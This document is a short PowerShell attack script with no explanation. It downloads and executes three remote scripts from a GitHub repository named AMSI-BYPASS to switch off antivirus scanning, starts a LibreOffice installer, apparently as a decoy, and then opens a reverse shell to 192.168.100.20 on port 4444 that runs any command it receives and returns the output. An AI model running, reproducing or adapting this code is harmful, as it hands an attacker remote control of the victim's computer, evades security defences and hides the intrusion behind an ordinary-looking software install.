 $LHOST = "192.168.100.20"
 $LPORT = 4444
 IEX (New-Object 
System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x
x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello.ps1"); IEX (New-Object 
System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x
x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello2.ps1"); IEX (New-Object 
System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x
x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello3.ps1"); MagicBypass;
 Start-Process -FilePath ".\LibreOffice_25.2.1_Win_x86-64.msi"
 $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
 $NetworkStream = $TCPClient.GetStream()
 $StreamReader = New-Object IO.StreamReader($NetworkStream)
 $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
 $StreamWriter.AutoFlush = $true
 while ($TCPClient.Connected) {
 try {
 $Command = $StreamReader.ReadLine()
 if ($Command) {
 $Output = try { 
$Result = Invoke-Expression $Command 2>&1
 $Result | Out-String 
} catch { 
$_.Exception.Message 
}
$StreamWriter.WriteLine($Output)
 }
 } catch {
 $StreamWriter.WriteLine("Error: $_")
 break
 }
 }
 $TCPClient.Close()
 $NetworkStream.Close()
 $StreamReader.Close()
 $StreamWriter.Close()
